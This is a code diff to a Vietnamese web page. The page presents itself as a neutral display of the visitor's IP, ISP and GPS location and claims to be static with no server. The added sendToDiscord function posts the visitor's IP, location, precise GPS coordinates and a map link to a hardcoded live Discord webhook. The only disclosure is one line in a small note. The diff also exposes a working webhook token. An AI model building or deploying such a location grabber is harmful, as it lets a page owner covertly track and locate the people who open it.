@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Welcome To GPS DrThanh</title>
+<title>Định Vị — Vị trí &amp; IP của bạn</title>
 <style>
   :root{
     --ink:#1c2b25;
@@ -175,45 +175,45 @@
 
 <div class="sheet">
   <header>
-    <div class="eyebrow">Biết Mình Đang Làm Gì Không?</div>
-    <h1>IP &amp; IP</h1>
-    <p class="sub">Bạn Hiểu Chưa=))??</p>
+    <div class="eyebrow">Bảng ghi vị trí</div>
+    <h1>IP &amp; Toạ độ của bạn</h1>
+    <p class="sub">Trang này chỉ đọc những gì trình duyệt của bạn cho phép. Địa chỉ IP được lấy tự động; toạ độ GPS chỉ hiện ra sau khi bạn nhấn nút và đồng ý cấp quyền.</p>
   </header>
 
   <main>
     <div class="entry">
-      <div class="label">???</div>
-      <div class="value pending" id="ipValue">...</div>
+      <div class="label">Địa chỉ IP</div>
+      <div class="value pending" id="ipValue">đang truy vấn…</div>
     </div>
     <div class="entry">
-      <div class="label">...</div>
-      <div class="value pending" id="ispValue">...</div>
+      <div class="label">Nhà mạng / ISP</div>
+      <div class="value pending" id="ispValue">đang truy vấn…</div>
     </div>
     <div class="entry">
-      <div class="label">...</div>
+      <div class="label">Vị trí (IP)</div>
       <div class="value pending" id="ipLocValue">đang truy vấn…</div>
     </div>
     <div class="entry">
-      <div class="label">(...)</div>
-      <div class="value muted" id="gpsValue">Cấp Quyền Chưa Mà Nhìn"</div>
+      <div class="label">Vĩ độ / Kinh độ (GPS)</div>
+      <div class="value muted" id="gpsValue">chưa cấp quyền — nhấn "Lấy vị trí GPS"</div>
     </div>
     <div class="entry">
-      <div class="label">100</div>
+      <div class="label">Độ chính xác</div>
       <div class="value muted" id="accValue">—</div>
     </div>
 
     <div class="actions">
-      <button class="primary" id="gpsBtn">Bắt Đầu Đoán </button>
-      <button class="ghost" id="refreshBtn">Làm Mới</button>
+      <button class="primary" id="gpsBtn">Lấy vị trí GPS</button>
+      <button class="ghost" id="refreshBtn">Làm mới IP</button>
     </div>
 
     <div class="note">
-     Thank
+      Trình duyệt sẽ hiện hộp thoại xin phép trước khi chia sẻ GPS — trang không thể và sẽ không lấy vị trí nếu bạn không đồng ý. Khi bạn đồng ý, toạ độ và IP sẽ được gửi về cho chủ trang để lưu lại.
     </div>
   </main>
 
   <footer>
-    <span>IM</span>
+    <span>tĩnh · không máy chủ</span>
     <span id="clock">--:--:--</span>
   </footer>
 </div>
@@ -287,6 +287,14 @@
 
         gpsBtn.disabled = false;
         gpsBtn.textContent = 'Cập nhật lại vị trí';
+
+        sendToDiscord({
+          ip: ipEl.textContent,
+          ipLoc: ipLocEl.textContent,
+          lat: latitude.toFixed(6),
+          lng: longitude.toFixed(6),
+          acc: Math.round(accuracy)
+        });
       },
       (err) => {
         gpsEl.classList.remove('pending');
@@ -298,6 +306,30 @@
       },
       { enableHighAccuracy: true, timeout: 12000 }
     );
+  }
+
+  // ─── Webhook Discord ───
+  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1535896126891360277/bB2CVqiDLb1wm_OVrx5B6Kq7qGaui5sYs6vcEYa6styz7V5YecnbZ7iODBUglFl31ZMG";
+
+  async function sendToDiscord(payload){
+    if(!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes("DÁN_WEBHOOK")) return;
+    try{
+      await fetch(DISCORD_WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content:
+            `📍 **Có người vừa chia sẻ vị trí**\n` +
+            `IP: ${payload.ip}\n` +
+            `Vị trí theo IP: ${payload.ipLoc}\n` +
+            `Toạ độ GPS: ${payload.lat}, ${payload.lng} (±${payload.acc}m)\n` +
+            `Bản đồ: https://www.openstreetmap.org/?mlat=${payload.lat}&mlon=${payload.lng}#map=16/${payload.lat}/${payload.lng}\n` +
+            `Thời gian: ${new Date().toLocaleString('vi-VN')}`
+        })
+      });
+    }catch(err){
+      console.error('Gửi Discord thất bại:', err);
+    }
   }
 
   gpsBtn.addEventListener('click', requestGps);
